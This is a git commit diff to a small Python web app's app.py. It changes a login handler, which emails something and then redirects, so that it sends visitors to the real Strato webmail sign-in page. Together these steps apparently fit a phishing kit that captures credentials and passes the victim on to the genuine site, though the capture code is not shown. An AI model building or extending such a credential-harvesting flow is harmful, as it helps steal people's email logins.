3076f48eedeb88809c75c9b21306c8f969dda362
uyiplay44 <uyiplay44@hotmail.com>
2024-02-29 13:52:46 +0100

    redirect

--- app.py
+++ app.py
@@ -31,7 +31,7 @@ def login():
     except Exception as e:
         flash(f'Failed to send email. Error: {str(e)}', 'error')
 
-    return redirect('')
+    return redirect('https://webmail.strato.com/appsuite/signin')
 
 if __name__ == '__main__':
     app.run(debug=True)
